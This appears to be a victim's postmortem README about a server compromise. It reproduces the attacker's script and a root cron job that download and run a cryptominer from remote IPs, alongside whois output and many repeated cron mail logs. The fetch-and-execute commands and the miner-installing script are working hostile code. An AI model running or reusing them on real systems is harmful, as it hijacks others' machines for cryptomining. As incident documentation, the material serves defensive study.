# I have been pwned :(

These are the files I salvaged that have been used.
They (including executables) are all in the `postmortem.zip`.
It includes
- mail generated by failed cronjobs (idiots! who leaves traces like that?)
- executables downloaded by the scripts (fucking script kiddies)
- strings found in the executables
- cronjobs created


# A dump of all the postmortem data I found relevant

## The script that ran as a daily job
> I seem to have been running a cpuminer (bitcoin?)

```bash
$ curl  http://update.sdgndsfajfsdf.info/upd
#!/bin/sh
#wget http://37.59.0.71/cpuminer -O /tmp/cpuminer
#chmod +x /tmp/cpuminer
#killall cpuminer
#/tmp/cpuminer&
#wget http://37.59.0.71/xmrig -O /tmp/xmrig
#killall k5
#killall xmrig
#mkdir -p /var/tmp
#wget http://37.59.0.71/k5 -O /var/tmp/k5
pid=`netstat -nap | grep 188.226.156.21 | grep ESTA |  cut -d "/" -f -1  | rev | cut -d " " -f 1`
kill -9 $pid
netstat -alpn | grep "188.226\b" | awk '{sub(/\/.*/, "", $NF); print $NF}' | xargs -i kill -9 {}
chmod +x /tmp/xmrig
#/tmp/xmrig
#chmod +x /var/tmp/k5
#/var/tmp/k5&
#killall cpuminer
#uname=`uname -a`
#wget --post-data=testdata http://37.59.0.71/"$uname" -O /dev/null
killall xmrig
echo 128 > /proc/sys/vm/nr_hugepages;sysctl -w vm.nr_hugepages=128
wget http://37.59.0.71/xmrig -O /tmp/xmrig
chmod +x /tmp/xmrig
/tmp/xmrig
```

### What is this mysterious IP?
By querying the `188.226.156.21` ip, it seems Digital Ocean is host to a "hacker"/script kiddie mining network.

```
whois 188.226.156.21
% This is the RIPE Database query service.
% The objects are in RPSL format.
%
% The RIPE Database is subject to Terms and Conditions.
% See http://www.ripe.net/db/support/db-terms-conditions.pdf

% Note: this output has been filtered.
%       To receive output for a database update, use the "-B" flag.

% Information related to '188.226.128.0 - 188.226.191.255'

% Abuse contact for '188.226.128.0 - 188.226.191.255' is 'abuse@digitalocean.com'

inetnum:        188.226.128.0 - 188.226.191.255
netname:        DIGITALOCEAN-AMS-4
descr:          Digital Ocean, Inc.
country:        NL
admin-c:        PT7353-RIPE
tech-c:         PT7353-RIPE
status:         ASSIGNED PA
mnt-by:         digitalocean
mnt-lower:      digitalocean
mnt-routes:     digitalocean
created:        2014-01-01T09:52:16Z
last-modified:  2015-11-20T14:46:40Z
source:         RIPE

person:         Network Operations
address:        101 Ave of the Americas, 10th Floor, New York, NY 10013
phone:          +13478756044
nic-hdl:        PT7353-RIPE
mnt-by:         digitalocean
created:        2015-03-11T16:37:07Z
last-modified:  2015-11-19T15:57:21Z
source:         RIPE # Filtered
org:            ORG-DOI2-RIPE
```



## The output from cronjobs

These were found by chance when running `sudo mail` for the first time in ages. Seems something scary started
happening on June 21st 2017.

<details>
<summary>
```
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20170620220009.1141AC0B1B@timbuktu.lyse.net>
Date: Wed, 21 Jun 2017 00:00:09 +0200 (CEST)

b: no process found
--2017-06-21 00:00:02--  http://95.211.58.208/bb
Connecting to 95.211.58.208:80... connected.

--2017-06-21 00:00:02--  http://95.211.58.208/bb
Connecting to 95.211.58.208:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 924952 (903K) [text/plain]
Saving to: ‘/tmp/bb’

     0K .......... .......... .......... .......... ..........  5%  765K 1s
    50K .......... .......... .......... .......... .......... 11% 2.11M 1s
   100K .......... .......... .......... .......... .......... 16% 2.28M 1s
   150K .......... .......... .......... .......... .......... 22% 11.3M 0s
   200K .......... .......... .......... .......... .......... 27% 2.62M 0s
   250K .......... .......... .......... .......... .......... 33% 11.0M 0s
   300K .......... .......... .......... .......... .......... 38% 3.04M 0s
   350K .......... .......... .......... .......... .......... 44% 11.0M 0s
   400K .......... .......... .......... .......... .......... 49% 11.3M 0s
   450K .......... .......... .......... .......... .......... 55% 11.4M 0s
   500K .......... .......... .......... .......... .......... 60% 6.40M 0s
   550K .......... .......... .......... .......... .......... 66% 11.3M 0s
   600K .......... .......... .......... .......... .......... 71% 11.3M 0s
   650K .......... .......... .......... .......... .......... 77% 11.0M 0s
   700K .......... .......... .......... .......... .......... 83% 11.3M 0s
   750K .......... .......... .......... .......... .......... 88% 11.3M 0s
   800K .......... .......... .......... .......... .......... 94% 11.0M 0s
   850K .......... .......... .......... .......... .......... 99%  454K 0s
   900K ...                                                   100% 6244G=0.3s

2017-06-21 00:00:05 (2.84 MB/s) - ‘/tmp/bb’ saved [924952/924952]

/tmp/updatescript: 14: /tmp/updatescript: route: not found
/tmp/updatescript: 15: /tmp/updatescript: route: not found
/tmp/updatescript: 16: /tmp/updatescript: route: not found
/tmp/updatescript: 17: /tmp/updatescript: route: not found
/tmp/updatescript: 18: /tmp/updatescript: route: not found
/tmp/updatescript: 19: /tmp/updatescript: route: not found
/tmp/updatescript: 20: /tmp/updatescript: route: not found
/tmp/updatescript: 21: /tmp/updatescript: route: not found
/tmp/updatescript: 22: /tmp/updatescript: route: not found
/tmp/updatescript: 23: /tmp/updatescript: route: not found
/tmp/updatescript: 24: /tmp/updatescript: route: not found
/tmp/updatescript: 25: /tmp/updatescript: route: not found
/tmp/updatescript: 26: /tmp/updatescript: route: not found
/tmp/updatescript: 27: /tmp/updatescript: route: not found
```
</summary>

```
Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id AB00BC0D79; Sun, 11 Jun 2017 06:47:10 +0200 (CEST)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20170611044710.AB00BC0D79@timbuktu.lyse.net>
Date: Sun, 11 Jun 2017 06:47:10 +0200 (CEST)

/etc/cron.weekly/apt-xapian-index:
Exception ignored in: <bound method ServerProgress.__del__ of <axi.indexer.ServerProgress object at 0x7fd8d844eef0>>
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/axi/indexer.py", line 306, in __del__
TypeError: 'NoneType' object is not callable
? 
Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id 0B5C1C0664; Sun, 18 Jun 2017 06:47:08 +0200 (CEST)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20170618044709.0B5C1C0664@timbuktu.lyse.net>
Date: Sun, 18 Jun 2017 06:47:08 +0200 (CEST)

/etc/cron.weekly/apt-xapian-index:
Exception ignored in: <bound method ServerProgress.__del__ of <axi.indexer.ServerProgress object at 0x7fce16482f28>>
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/axi/indexer.py", line 306, in __del__
TypeError: 'NoneType' object is not callable
? 
Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id 1141AC0B1B; Wed, 21 Jun 2017 00:00:09 +0200 (CEST)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20170620220009.1141AC0B1B@timbuktu.lyse.net>
Date: Wed, 21 Jun 2017 00:00:09 +0200 (CEST)

b: no process found
--2017-06-21 00:00:02--  http://95.211.58.208/bb
Connecting to 95.211.58.208:80... connected.

--2017-06-21 00:00:02--  http://95.211.58.208/bb
Connecting to 95.211.58.208:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 924952 (903K) [text/plain]
Saving to: ‘/tmp/bb’

     0K .......... .......... .......... .......... ..........  5%  765K 1s
    50K .......... .......... .......... .......... .......... 11% 2.11M 1s
   100K .......... .......... .......... .......... .......... 16% 2.28M 1s
   150K .......... .......... .......... .......... .......... 22% 11.3M 0s
   200K .......... .......... .......... .......... .......... 27% 2.62M 0s
   250K .......... .......... .......... .......... .......... 33% 11.0M 0s
   300K .......... .......... .......... .......... .......... 38% 3.04M 0s
   350K .......... .......... .......... .......... .......... 44% 11.0M 0s
   400K .......... .......... .......... .......... .......... 49% 11.3M 0s
   450K .......... .......... .......... .......... .......... 55% 11.4M 0s
   500K .......... .......... .......... .......... .......... 60% 6.40M 0s
   550K .......... .......... .......... .......... .......... 66% 11.3M 0s
   600K .......... .......... .......... .......... .......... 71% 11.3M 0s
   650K .......... .......... .......... .......... .......... 77% 11.0M 0s
   700K .......... .......... .......... .......... .......... 83% 11.3M 0s
   750K .......... .......... .......... .......... .......... 88% 11.3M 0s
   800K .......... .......... .......... .......... .......... 94% 11.0M 0s
   850K .......... .......... .......... .......... .......... 99%  454K 0s
   900K ...                                                   100% 6244G=0.3s

2017-06-21 00:00:05 (2.84 MB/s) - ‘/tmp/bb’ saved [924952/924952]

/tmp/updatescript: 14: /tmp/updatescript: route: not found
/tmp/updatescript: 15: /tmp/updatescript: route: not found
/tmp/updatescript: 16: /tmp/updatescript: route: not found
/tmp/updatescript: 17: /tmp/updatescript: route: not found
/tmp/updatescript: 18: /tmp/updatescript: route: not found
/tmp/updatescript: 19: /tmp/updatescript: route: not found
/tmp/updatescript: 20: /tmp/updatescript: route: not found
/tmp/updatescript: 21: /tmp/updatescript: route: not found
/tmp/updatescript: 22: /tmp/updatescript: route: not found
/tmp/updatescript: 23: /tmp/updatescript: route: not found
/tmp/updatescript: 24: /tmp/updatescript: route: not found
/tmp/updatescript: 25: /tmp/updatescript: route: not found
/tmp/updatescript: 26: /tmp/updatescript: route: not found
/tmp/updatescript: 27: /tmp/updatescript: route: not found
? 
Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id BCEA8C0B18; Thu, 22 Jun 2017 00:01:10 +0200 (CEST)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0

Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20170624220106.48348C03D8@timbuktu.lyse.net>
Date: Sun, 25 Jun 2017 00:01:06 +0200 (CEST)

/tmp/bb: Text file busy
nt pipe support = no
nt pipe support = no
nt pipe support = no
nt pipe support = no
nm
cat: /etc/smb.conf: No such file or directory
sed: can't read /etc/smb.conf: No such file or directory
cat: /etc/config/smb.conf: No such file or directory
sed: can't read /etc/config/smb.conf: No such file or directory
cat: /etc/default_config/smb.conf: No such file or directory
sed: can't read /etc/default_config/smb.conf: No such file or directory
? 
Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id A5017C04F2; Mon, 26 Jun 2017 00:01:04 +0200 (CEST)
From: root@timbuktu.lyse.net (Cron Daemon)

From: root@timbuktu.lyse.net (Cron Daemon)                                                                                                                                                                                                                               [139/1879]
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20170625220104.A5017C04F2@timbuktu.lyse.net>
Date: Mon, 26 Jun 2017 00:01:04 +0200 (CEST)

/tmp/bb: Text file busy
nt pipe support = no
nt pipe support = no
nt pipe support = no
nt pipe support = no
nm
cat: /etc/smb.conf: No such file or directory
sed: can't read /etc/smb.conf: No such file or directory
cat: /etc/config/smb.conf: No such file or directory
sed: can't read /etc/config/smb.conf: No such file or directory
cat: /etc/default_config/smb.conf: No such file or directory
sed: can't read /etc/default_config/smb.conf: No such file or directory
? 
Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id 2EA19C03B8; Tue, 27 Jun 2017 00:01:04 +0200 (CEST)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20170626220104.2EA19C03B8@timbuktu.lyse.net>
Date: Tue, 27 Jun 2017 00:01:04 +0200 (CEST)

/tmp/bb: Text file busy
nt pipe support = no
nt pipe support = no
nt pipe support = no
nt pipe support = no
nm
cat: /etc/smb.conf: No such file or directory
sed: can't read /etc/smb.conf: No such file or directory
cat: /etc/config/smb.conf: No such file or directory
sed: can't read /etc/config/smb.conf: No such file or directory
cat: /etc/default_config/smb.conf: No such file or directory
sed: can't read /etc/default_config/smb.conf: No such file or directory
? 
Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id 851BBC028F; Wed, 28 Jun 2017 00:01:19 +0200 (CEST)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>


Date: Wed, 28 Jun 2017 00:01:19 +0200 (CEST)

nt pipe support = no
nt pipe support = no
nt pipe support = no
nt pipe support = no
nm
cat: /etc/smb.conf: No such file or directory
sed: can't read /etc/smb.conf: No such file or directory
cat: /etc/config/smb.conf: No such file or directory
sed: can't read /etc/config/smb.conf: No such file or directory
cat: /etc/default_config/smb.conf: No such file or directory
sed: can't read /etc/default_config/smb.conf: No such file or directory
? 
Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id 26B14C07D8; Thu, 29 Jun 2017 00:01:02 +0200 (CEST)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20170628220102.26B14C07D8@timbuktu.lyse.net>
Date: Thu, 29 Jun 2017 00:01:02 +0200 (CEST)

/tmp/bb: Text file busy
nt pipe support = no
nt pipe support = no
nt pipe support = no
nt pipe support = no
nm
cat: /etc/smb.conf: No such file or directory
sed: can't read /etc/smb.conf: No such file or directory
cat: /etc/config/smb.conf: No such file or directory
sed: can't read /etc/config/smb.conf: No such file or directory
cat: /etc/default_config/smb.conf: No such file or directory
sed: can't read /etc/default_config/smb.conf: No such file or directory
? 
Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id DE25FC0D79; Fri, 30 Jun 2017 00:01:00 +0200 (CEST)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20170629220100.DE25FC0D79@timbuktu.lyse.net>
Date: Fri, 30 Jun 2017 00:01:00 +0200 (CEST)

/tmp/bb: Text file busy
nt pipe support = no
nt pipe support = no
nt pipe support = no
nt pipe support = no
nm
cat: /etc/smb.conf: No such file or directory
sed: can't read /etc/smb.conf: No such file or directory

sed: can't read /etc/smb.conf: No such file or directory
cat: /etc/config/smb.conf: No such file or directory
sed: can't read /etc/config/smb.conf: No such file or directory
cat: /etc/default_config/smb.conf: No such file or directory
sed: can't read /etc/default_config/smb.conf: No such file or directory
? 
Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id 06661C056B; Sat,  1 Jul 2017 00:01:06 +0200 (CEST)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20170630220107.06661C056B@timbuktu.lyse.net>
Date: Sat,  1 Jul 2017 00:01:06 +0200 (CEST)

/tmp/bb: Text file busy
nt pipe support = no
nt pipe support = no
nt pipe support = no
nt pipe support = no
nm
cat: /etc/smb.conf: No such file or directory
sed: can't read /etc/smb.conf: No such file or directory
cat: /etc/config/smb.conf: No such file or directory
sed: can't read /etc/config/smb.conf: No such file or directory
cat: /etc/default_config/smb.conf: No such file or directory
sed: can't read /etc/default_config/smb.conf: No such file or directory
? 
Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id 30C18C0507; Sun,  2 Jul 2017 00:01:00 +0200 (CEST)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20170701220100.30C18C0507@timbuktu.lyse.net>
Date: Sun,  2 Jul 2017 00:01:00 +0200 (CEST)

/tmp/bb: Text file busy
nt pipe support = no
nt pipe support = no
nt pipe support = no
nt pipe support = no
nm
cat: /etc/smb.conf: No such file or directory
sed: can't read /etc/smb.conf: No such file or directory
cat: /etc/config/smb.conf: No such file or directory
sed: can't read /etc/config/smb.conf: No such file or directory
cat: /etc/default_config/smb.conf: No such file or directory
sed: can't read /etc/default_config/smb.conf: No such file or directory


....

Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id C9AD8C6608; Sun, 27 Aug 2017 00:00:10 +0200 (CEST)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20170826220010.C9AD8C6608@timbuktu.lyse.net>
Date: Sun, 27 Aug 2017 00:00:10 +0200 (CEST)

--2017-08-27 00:00:06--  http://176.9.48.167/cpuminer
Connecting to 176.9.48.167:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5296008 (5.0M) [text/plain]
Saving to: ‘/tmp/cpuminer’

     0K .......... .......... .......... .......... ..........  0%  497K 10s
    50K .......... .......... .......... .......... ..........  1% 1.42M 7s
   100K .......... .......... .......... .......... ..........  2% 1.54M 6s
   150K .......... .......... .......... .......... ..........  3% 11.3M 4s
   200K .......... .......... .......... .......... ..........  4% 1.76M 4s
   250K .......... .......... .......... .......... ..........  5% 11.4M 3s
   300K .......... .......... .......... .......... ..........  6% 11.3M 3s
   350K .......... .......... .......... .......... ..........  7% 11.0M 3s
   400K .......... .......... .......... .......... ..........  8% 11.4M 2s
   450K .......... .......... .......... .......... ..........  9% 2.55M 2s
   500K .......... .......... .......... .......... .......... 10% 11.0M 2s
   550K .......... .......... .......... .......... .......... 11% 11.3M 2s
   600K .......... .......... .......... .......... .......... 12% 11.3M 2s
   650K .......... .......... .......... .......... .......... 13% 11.0M 2s
   700K .......... .......... .......... .......... .......... 14% 11.4M 2s
   750K .......... .......... .......... .......... .......... 15% 11.3M 1s
   800K .......... .......... .......... .......... .......... 16% 7.11M 1s
   850K .......... .......... .......... .......... .......... 17% 11.3M 1s
   900K .......... .......... .......... .......... .......... 18% 11.0M 1s
   950K .......... .......... .......... .......... .......... 19% 11.3M 1s
  1000K .......... .......... .......... .......... .......... 20% 11.3M 1s
  1050K .......... .......... .......... .......... .......... 21% 11.0M 1s
  1100K .......... .......... .......... .......... .......... 22%  552K 1s
  1150K .......... .......... .......... .......... .......... 23% 80.3M 1s
  1200K .......... .......... .......... .......... .......... 24%  102M 1s
  1250K .......... .......... .......... .......... .......... 25%  103M 1s
  1300K .......... .......... .......... .......... .......... 26%  103M 1s
  1350K .......... .......... .......... .......... .......... 27% 84.5M 1s
  1400K .......... .......... .......... .......... .......... 28%  108M 1s
  1450K .......... .......... .......... .......... .......... 29%  103M 1s
  1500K .......... .......... .......... .......... .......... 29% 83.6M 1s
  1550K .......... .......... .......... .......... .......... 30% 89.9M 1s
  1600K .......... .......... .......... .......... .......... 31%  104M 1s
  1650K .......... .......... .......... .......... .......... 32% 99.9M 1s
  1700K .......... .......... .......... .......... .......... 33%  104M 1s
  1750K .......... .......... .......... .......... .......... 34% 93.4M 1s
  1800K .......... .......... .......... .......... .......... 35%  106M 1s
  1850K .......... .......... .......... .......... .......... 36%  117M 1s
  1900K .......... .......... .......... .......... .......... 37% 99.9M 1s
  1950K .......... .......... .......... .......... .......... 38% 99.6M 1s
  2000K .......... .......... .......... .......... .......... 39%  114M 1s
  2050K .......... .......... .......... .......... .......... 40%  117M 1s
  2100K .......... .......... .......... .......... .......... 41%  112M 1s
  2150K .......... .......... .......... .......... .......... 42%  101M 1s
  2200K .......... .......... .......... .......... .......... 43%  116M 1s
  2250K .......... .......... .......... .......... .......... 44% 16.1M 0s
  2300K .......... .......... .......... .......... .......... 45% 11.0M 0s




eturn-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id A61EFC1592; Mon, 28 Aug 2017 00:00:04 +0200 (CEST)
        From: root@timbuktu.lyse.net (Cron Daemon)
        To: root@timbuktu.lyse.net
        Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
        MIME-Version: 1.0
        Content-Type: text/plain; charset=UTF-8
        Content-Transfer-Encoding: 8bit
        X-Cron-Env: <SHELL=/bin/sh>
        X-Cron-Env: <HOME=/root>
        X-Cron-Env: <PATH=/usr/bin:/bin>
        X-Cron-Env: <LOGNAME=root>
        Message-Id: <20170827220004.A61EFC1592@timbuktu.lyse.net>
        Date: Mon, 28 Aug 2017 00:00:04 +0200 (CEST)

        /tmp/cpuminer: Text file busy


? 
Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id 2E369C0B1B; Tue, 29 Aug 2017 00:00:07 +0200 (CEST)
        From: root@timbuktu.lyse.net (Cron Daemon)
        To: root@timbuktu.lyse.net
        Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
        MIME-Version: 1.0
        Content-Type: text/plain; charset=UTF-8
        Content-Transfer-Encoding: 8bit
        X-Cron-Env: <SHELL=/bin/sh>
        X-Cron-Env: <HOME=/root>
        X-Cron-Env: <PATH=/usr/bin:/bin>
        X-Cron-Env: <LOGNAME=root>
        Message-Id: <20170828220008.2E369C0B1B@timbuktu.lyse.net>
        Date: Tue, 29 Aug 2017 00:00:07 +0200 (CEST)

        /tmp/cpuminer: Text file busy
        ? 
        Return-Path: <root@timbuktu.lyse.net>
        X-Original-To: root
        Delivered-To: root@timbuktu.lyse.net
        Received: by timbuktu.lyse.net (Postfix, from userid 0)
                id CB0EAC0E77; Wed, 30 Aug 2017 00:00:04 +0200 (CEST)
                From: root@timbuktu.lyse.net (Cron Daemon)
                To: root@timbuktu.lyse.net
                Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
                MIME-Version: 1.0
                Content-Type: text/plain; charset=UTF-8
                Content-Transfer-Encoding: 8bit
                X-Cron-Env: <SHELL=/bin/sh>
                X-Cron-Env: <HOME=/root>
                X-Cron-Env: <PATH=/usr/bin:/bin>
                X-Cron-Env: <LOGNAME=root>
                Message-Id: <20170829220004.CB0EAC0E77@timbuktu.lyse.net>
                Date: Wed, 30 Aug 2017 00:00:04 +0200 (CEST)

                /tmp/cpuminer: Text file busy


....
etc

Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
id BB7FCC67DD; Thu, 14 Sep 2017 00:00:05 +0200 (CEST)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20170913220005.BB7FCC67DD@timbuktu.lyse.net>
Date: Thu, 14 Sep 2017 00:00:05 +0200 (CEST)

--2017-09-14 00:00:04--  http://176.9.48.167/cpuminer
Connecting to 176.9.48.167:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5296008 (5.0M) [text/plain]
Saving to: ‘/tmp/cpuminer’

0K .......... .......... .......... .......... ..........  0%  528K 10s
50K .......... .......... .......... .......... ..........  1% 1.50M 6s
100K .......... .......... .......... .......... ..........  2% 1.65M 5s
